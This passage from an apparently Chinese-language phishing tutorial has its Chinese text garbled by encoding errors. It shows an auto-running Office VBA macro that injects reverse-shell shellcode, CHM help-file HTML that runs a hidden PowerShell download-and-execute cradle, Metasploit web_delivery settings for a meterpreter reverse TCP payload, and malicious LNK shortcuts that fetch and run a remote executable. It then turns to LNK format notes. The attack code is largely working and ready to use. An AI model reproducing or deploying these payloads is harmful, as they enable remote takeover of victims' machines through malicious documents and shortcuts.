class="number">213</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">234</span>,<span class="number">104</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">89</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">41</span>,<span class="number">128</span>,<span class="number">107</span>,<span class="number">0</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">106</span>,<span class="number">10</span>,<span class="number">65</span>,<span class="number">94</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">72</span>,<span class="number">255</span>,<span class="number">192</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">194</span>,<span class="number">72</span>,<span class="number">255</span>,<span class="number">192</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">193</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">234</span>,<span class="number">15</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">199</span>,<span class="number">106</span>,<span class="number">16</span>,<span class="number">65</span>, _</span><br><span class="line"><span class="number">88</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">226</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">153</span>,<span class="number">165</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">133</span>,<span class="number">192</span>,<span class="number">116</span>,<span class="number">10</span>,<span class="number">73</span>,<span class="number">255</span>,<span class="number">206</span>,<span class="number">117</span>,<span class="number">229</span>,<span class="number">232</span>,<span class="number">147</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">131</span>,<span class="number">236</span>,<span class="number">16</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">226</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">106</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">2</span>,<span class="number">217</span>,<span class="number">200</span>,<span class="number">95</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">131</span>,<span class="number">248</span>,<span class="number">0</span>,<span class="number">126</span>,<span class="number">85</span>,<span class="number">72</span>,<span class="number">131</span>,<span class="number">196</span>,<span class="number">32</span>,<span class="number">94</span>,<span class="number">137</span>,<span class="number">246</span>,<span class="number">106</span>,<span class="number">64</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">242</span>, _</span><br><span class="line"><span class="number">72</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">88</span>,<span class="number">164</span>,<span class="number">83</span>,<span class="number">229</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">195</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">199</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">240</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">218</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">2</span>,<span class="number">217</span>,<span class="number">200</span>,<span class="number">95</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">131</span>,<span class="number">248</span>,<span class="number">0</span>,<span class="number">125</span>,<span class="number">40</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">87</span>,<span class="number">89</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">106</span>,<span class="number">0</span>,<span class="number">90</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">11</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">48</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">87</span>,<span class="number">89</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">97</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">73</span>,<span class="number">255</span>,<span class="number">206</span>,<span class="number">233</span>,<span class="number">60</span>,<span class="number">255</span>, _</span><br><span class="line"><span class="number">255</span>,<span class="number">255</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">195</span>,<span class="number">72</span>,<span class="number">41</span>,<span class="number">198</span>,<span class="number">72</span>,<span class="number">133</span>,<span class="number">246</span>,<span class="number">117</span>,<span class="number">180</span>,<span class="number">65</span>,<span class="number">255</span>,<span class="number">231</span>,<span class="number">88</span>,<span class="number">106</span>,<span class="number">0</span>,<span class="number">89</span>,<span class="number">73</span>,<span class="number">199</span>,<span class="number">194</span>,<span class="number">240</span>,<span class="number">181</span>,<span class="number">162</span>,<span class="number">86</span>,<span class="number">255</span>,<span class="number">213</span>)</span><br><span class="line"></span><br><span class="line">        Esc = VirtualAlloc(<span class="number">0</span>, UBound(Laclv), <span class="number">&amp;H1000</span>, <span class="number">&amp;H40</span>)</span><br><span class="line">        <span class="keyword">For</span> Whxffnbhl = LBound(Laclv) <span class="keyword">To</span> UBound(Laclv)</span><br><span class="line">                Imtzv = Laclv(Whxffnbhl)</span><br><span class="line">                Hyub = RtlMoveMemory(Esc + Whxffnbhl, Imtzv, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">Next</span> Whxffnbhl</span><br><span class="line">        Hyub = CreateThread(<span class="number">0</span>, <span class="number">0</span>, Esc, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">        Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Workbook_Open()</span><br><span class="line">        Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/5.png" alt="image-20200726210839105"></p><p>ä¿å­˜ä¸‹å°±å¯ä»¥</p><p>ç„¶åæˆ‘ä»¬åœ¨kaliä¸Šç›‘å¬</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/6.png" alt="image-20200726211842860"></p><p>å¸¦æœ‰å®çš„Wordä¿å­˜æ˜¯è¿™æ ·çš„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/7.png" alt="image-20200726211912494"></p><p>æˆ‘ä»¬è¿è¡Œä¸‹è¯•è¯•</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/8.png" alt="image-20200726221726990"></p><p>ä¸Šçº¿æˆåŠŸ</p><h2 id="è¶…é“¾æ¥"><a href="#è¶…é“¾æ¥" class="headerlink" title="è¶…é“¾æ¥"></a>è¶…é“¾æ¥</h2><p>åœ¨PDFã€Officeæ–‡æ¡£ä¸­å†…åµŒä¸€ä¸ªè·³è½¬é“¾æ¥æ˜¯å¾ˆæ—©æœŸçš„é’“é±¼æ–¹å¼ï¼Œé€šè¿‡æ–‡å­—ä¿¡æ¯çš„å¼•å¯¼ï¼Œè®©å—å®³è€…ç‚¹å¼€é¡µé¢ï¼Œå¦‚æœç¼ºä¹æˆ’å¿ƒï¼Œå°±å¯èƒ½ä¼šè·å–åˆ°å—å®³è€…çš„è´¦å·ã€å¯†ç ã€é“¶è¡Œå¡ã€èº«ä»½è¯ç­‰ä¿¡æ¯ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/9.png" alt="img"></p><h2 id="CHMæ–‡æ¡£"><a href="#CHMæ–‡æ¡£" class="headerlink" title="CHMæ–‡æ¡£"></a>CHMæ–‡æ¡£</h2><p>CHMæ˜¯Windowså¸®åŠ©æ–‡ä»¶ï¼ˆå¦‚ç”µå­ä¹¦ï¼‰ä½¿ç”¨çš„æ‰©å±•åï¼Œæ­¤æ–‡ä»¶å¯ä»¥è¢«æ¤å…¥å¯æ‰§è¡Œä»£ç ã€‚</p><p>ç¼ºç‚¹ï¼šå…¶ç¼ºç‚¹å°±æ˜¯æ‰“å¼€æ—¶ä¼šå‡ºç°å¼¹é»‘æ¡†ã€å¡é¡¿ï¼Œå®¹æ˜“è¢«å¯Ÿè§‰ã€‚</p><h3 id="æ”¶å·¥åˆ¶ä½œé’“é±¼é‚®ä»¶"><a href="#æ”¶å·¥åˆ¶ä½œé’“é±¼é‚®ä»¶" class="headerlink" title="æ”¶å·¥åˆ¶ä½œé’“é±¼é‚®ä»¶"></a>æ”¶å·¥åˆ¶ä½œé’“é±¼é‚®ä»¶</h3><p>åˆ¶ä½œä¸€ä¸ªCHMæ–‡æ¡£ï¼Œä½¿ç”¨EasyCHMæ¥åˆ¶ä½œ</p><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼ˆåå­—éšæ„ï¼‰ï¼Œåœ¨æ–‡ä»¶å¤¹é‡Œé¢å†åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼ˆåå­—éšæ„ï¼‰å’Œä¸€ä¸ªindex.htmlæ–‡ä»¶ï¼Œåœ¨ä¸¤ä¸ªæ–‡ä»¶å¤¹å†…éƒ¨åˆ›å»ºå„åˆ›å»ºä¸€ä¸ªindex.htmlæ–‡ä»¶ã€‚ç„¶åå…ˆå°†ä¸‹åˆ—ä»£ç å¤åˆ¶åˆ°æ ¹æ–‡ä»¶å¤¹ä¸­çš„index.htmlä¸­</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">hello word </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,calc.exe&#x27;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¯´çš„æ ¹æ–‡ä»¶å¤¹çš„index.htmlæ˜¯è¿è¡Œå°±ä¼šæ‰§è¡Œæ–‡ä»¶ï¼Œè€Œå¦å¤–test1å’Œtest2æ˜¯éœ€è¦ç‚¹å‡»æ‰ä¼šæ‰§è¡Œçš„ï¼Œæ‰€æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹æˆ‘ä»¬ä¸å¡«å†™ä»»ä½•ä¸œè¥¿</p><p>ç›´æ¥ä¸ŠGIFå›¾æ¥æ¼”ç¤º</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/10.gif" alt="2"></p><h3 id="åˆ©ç”¨CS-msfåˆ¶ä½œé’“é±¼CHMæ–‡ä»¶"><a href="#åˆ©ç”¨CS-msfåˆ¶ä½œé’“é±¼CHMæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨CS/msfåˆ¶ä½œé’“é±¼CHMæ–‡ä»¶"></a>åˆ©ç”¨CS/msfåˆ¶ä½œé’“é±¼CHMæ–‡ä»¶</h3><p>CSåˆ¶ä½œæ–¹å¼</p><p>ç‚¹å‡»attacksâ€”â€”&gt;web Drive byâ€”â€”&gt;scripted web Delivery</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/11.png" alt="image-20200811174211768"></p><p>ç”Ÿæˆå¥½çš„å‘½ä»¤</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/12.png" alt="image-20200811174319596"></p><p>MSFåˆ¶ä½œæ–¹å¼</p><p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery </span><br><span class="line"><span class="built_in">set</span> target 2</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.10.128 <span class="comment">#æœ¬æœºåœ°å€</span></span><br><span class="line"><span class="built_in">set</span> srvhost 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> srvport 8080</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/13.png" alt="1"></p><p>ç„¶åæˆ‘ä»¬æŠŠMSFå‘½ä»¤æ’å…¥åˆ°CHMæ–‡ä»¶é‡Œé¢ï¼Œæ³¨æ„æ‰§è¡Œçš„è¿›ç¨‹é‚£è¾¹è¦ç”¨<code>,</code>å·éš”å¼€</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,powershell.exe, -nop -w hidden -c $Y=new-object net.webclient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null)&#123;$Y.proxy=[Net.WebRequest]::GetSystemWebProxy();$Y.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;&#125;;IEX ([System.Text.Encoding]::ASCII.GetString($Y.downloaddata(&#x27;http://192.168.1.8:8080/EN7JqNv&#x27;)));&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™è¾¹ä»¥MSFä½œä¸ºæ¼”ç¤º</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/14.png" alt="2"></p><h2 id="LNKé’“é±¼"><a href="#LNKé’“é±¼" class="headerlink" title="LNKé’“é±¼"></a>LNKé’“é±¼</h2><p>åˆ¶ä½œå¿«æ·æ–¹å¼æ¥é’“é±¼ï¼Œéœ€è¦åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/15.png" alt="1"></p><p>æˆ‘ä»¬å°†ä»»æ„ä¸€ä¸ªå¿«æ·æ–¹å¼çš„â€œå±æ€§â€ä¸­â€œç›®æ ‡â€çš„å€¼ä¿®æ”¹ä¸ºå¦‚ä¸‹å­—ç¬¦ä¸²ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\system32\cmd.exe cmd /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).DownloadFile(<span class="string">&#x27;http://127.0.0.1/1.exe&#x27;</span>,<span class="string">&#x27;.\\1.exe&#x27;</span>);&amp;cmd /c .\\1.exe</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬å†æ¬¡è¿è¡Œè¿™ä¸ªå¿«æ·æ–¹å¼æ—¶ï¼Œå°±è¾¾åˆ°äº†åˆ©ç”¨powershellä»è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°å¹¶æ‰§è¡Œçš„åŠŸèƒ½ã€‚è¿™ä»…ä»…æ˜¯å…¶ä¸­ä¸€ç§ç”¨æ³•ï¼Œè¿˜æœ‰å„ç§ä¸åŒçš„æ–¹æ³•éƒ½å¯ä»¥æ¼”åŒ–å‡ºæ¥ã€‚å°±çœ‹ä½ è„‘æ´æœ‰å¤šå¤§ã€‚</p><p>å¿«é€Ÿç”Ÿæˆlnkæ ·æœ¬</p><ul><li><p>åˆ›å»º<strong>test.ps1</strong>æ–‡ä»¶</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> <span class="literal">-comObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="string">&quot;test.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$Shortcut</span>.TargetPath = <span class="string">&quot;%SystemRoot%\system32\cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.IconLocation = <span class="string">&quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Arguments = <span class="string">&quot;cmd /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).DownloadFile(&#x27;http://192.168.1.7:8000/ascotbe.exe&#x27;,&#x27;.\\ascotbe.exe&#x27;);&amp;cmd /c .\\ascotbe.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure></li><li><p>ç„¶åè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy RemoteSigned -file test.ps1</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/16.png" alt="image-20200812214347733"></p><p>æˆ‘ä»¬ç”Ÿæˆçš„æ¶æ„æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥åªè¦æŠŠè¿™ä¸ªæ–‡ä»¶å‘é€ç»™ç›®æ ‡å³å¯ï¼ˆä½ æœåŠ¡å™¨ä¸€å®šè¦æœ‰ascotbe.exeè¿™ä¸ªæ–‡ä»¶ï¼‰</p><p>åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸ªæ–‡ä»¶ç„¶åå¼€ä¸ªhttpæœåŠ¡</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/17.png" alt="image-20200812215457292"></p><p>ç„¶åç›®æ ‡æœºå™¨è¿è¡Œæˆ‘ä»¬çš„å¿«æ·æ–¹å¼</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/18.png" alt="image-20200812215620974"></p><p>æ¥ç€æˆ‘ä»¬åªè¦æŠŠç”Ÿæˆå¥½çš„è¿™ä¸ª<strong>test</strong>å¿«æ·æ–¹å¼å‘é€ç»™ç›®æ ‡ï¼ŒåŒå‡»åå°±ä¼šæ”¶åˆ°ç³»ç»Ÿä¸Šçº¿äº†</p><h3 id="LNKæ–‡ä»¶æ ¼å¼è§£æ"><a href="#LNKæ–‡ä»¶æ ¼å¼è§£æ" class="headerlink" title="LNKæ–‡ä»¶æ ¼å¼è§£æ"></a>LNKæ–‡ä»¶æ ¼å¼è§£æ</h3><p>æˆ‘ä»¬ä»äºŒè¿›åˆ¶çš„æ ¼å¼æ¥è§£è¯»ä¸‹LNKæ–‡ä»¶ï¼Œå®Œæ•´æ–‡æ¡£å¯ä»¥çœ‹å¾®è½¯çš„æ–‡æ¡£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-shllink&#x2F;747629b3-b5be-452a-8101-b9a2ec49978c</span><br></pre></td></tr></table></figure><p>åˆ†ælnkæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ascotbe&#x2F;Random-img&#x2F;blob&#x2F;master&#x2F;Offer&#x2F;%E7%81%AB%E7%BB%92%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6.lnk</span><br></pre></td></tr></table></figure><h4 id="å¤´æ–‡ä»¶"><a href="#å¤´æ–‡ä»¶" class="headerlink" title="å¤´æ–‡ä»¶"></a>å¤´æ–‡ä»¶</h4><p>å‰é¢æœ‰20ä¸ªå­—èŠ‚å›ºå®šä¸å˜</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/26.png" alt="image-20200813164015856"></p><ul><li>HeaderSize(4 bytes, <code>offset 0x00</code>)ï¼š0x0000004C</li><li>LinkCLSID(16 bytes, <code>offset 0x04</code>)ï¼š00021401-0000-0000-C000-000000000046</li></ul><h4 id="LinkFlags"><a href="#LinkFlags" class="headerlink" title="LinkFlags"></a>LinkFlags</h4><p><code>offset 0x14</code>èµ·å§‹4å­—èŠ‚ä¸º<strong>LinkFlags</strong></p><table><thead><tr><th align="left">0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">1 0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">2 0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">3 0</th><th align="left">1</th></tr></thead><tbody><tr><td align="left">A</td><td align="left">B</td><td align="left">C</td><td align="left">D</td><td align="left">E</td><td align="left">F</td><td align="left">G</td><td align="left">H</td><td align="left">I</td><td align="left">J</td><td align="left">K</td><td align="left">L</td><td align="left">M</td><td align="left">N</td><td align="left">O</td><td align="left">P</td><td align="left">Q</td><td align="left">R</td><td align="left">S</td><td align="left">T</td><td align="left">U</td><td align="left">V</td><td align="left">W</td><td align="left">X</td><td align="left">Y</td><td align="left">Z</td><td align="left">A A</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr></tbody></table><p>è§£é‡Šå¦‚ä¸‹</p><table><thead><tr><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">A  <code>HasLinkTargetIDList</code></td><td align="left">The shell link is saved with an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_ae01eca8-1cd4-4472-8be6-bd5d3ab4d01c">item ID list (IDList)</a>. If this bit is set, a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/881d7a83-07a5-4702-93e3-f9fc34c3e1e4">LinkTargetIDList</a> structure (section 2.2) MUST follow the ShellLinkHeader. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">B  <code>HasLinkInfo</code></td><td align="left">The shell link is saved with link information. If this bit is set, a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/6813269d-0cc8-4be2-933f-e96e8e3412dc">LinkInfo</a> structure (section 2.3) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">C  <code>HasName</code></td><td align="left">The shell link is saved with a name string. If this bit is set, a <strong>NAME_STRING</strong> <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/17b69472-0f34-4bcf-b290-eccdb8de224b">StringData</a> structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">D  <code>HasRelativePath</code></td><td align="left">The shell link is saved with a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_f0a8c9c7-1368-4989-addb-4792c3206387">relative path</a> string. If this bit is set, a <strong>RELATIVE_PATH</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">E  <code>HasWorkingDir</code></td><td align="left">The shell link is saved with a working directory string. If this bit is set, a <strong>WORKING_DIR</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">F  <code>HasArguments</code></td><td align="left">The shell link is saved with command line arguments. If this bit is set, a <strong>COMMAND_LINE_ARGUMENTS</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">G  <code>HasIconLocation</code></td><td align="left">The shell link is saved with an icon location string. If this bit is set, an <strong>ICON_LOCATION</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">H  <code>IsUnicode</code></td><td align="left">The shell link contains Unicode encoded strings. This bit SHOULD be set. If this bit is set, the StringData section contains Unicode-encoded strings; otherwise, it contains strings that are encoded using the system default code page.</td></tr><tr><td align="left">I  <code>ForceNoLinkInfo</code></td><td align="left">The LinkInfo structure (section 2.3) is ignored.</td></tr><tr><td align="left">J  <code>HasExpString</code></td><td align="left">The shell link is saved with an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/2224d03c-f417-44a0-81e3-df169938ba72">EnvironmentVariableDataBlock (section 2.5.4)</a>.</td></tr><tr><td align="left">K  <code>RunInSeparateProcess</code></td><td align="left">The target is run in a separate virtual machine when launching a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_3b9c7b80-c157-438a-b53a-dbe935ec3243">link target</a> that is a 16-bit application.</td></tr><tr><td align="left">L  <code>Unused1</code></td><td align="left">A bit that is undefined and MUST be ignored.</td></tr><tr><td align="left">M  <code>HasDarwinID</code></td><td 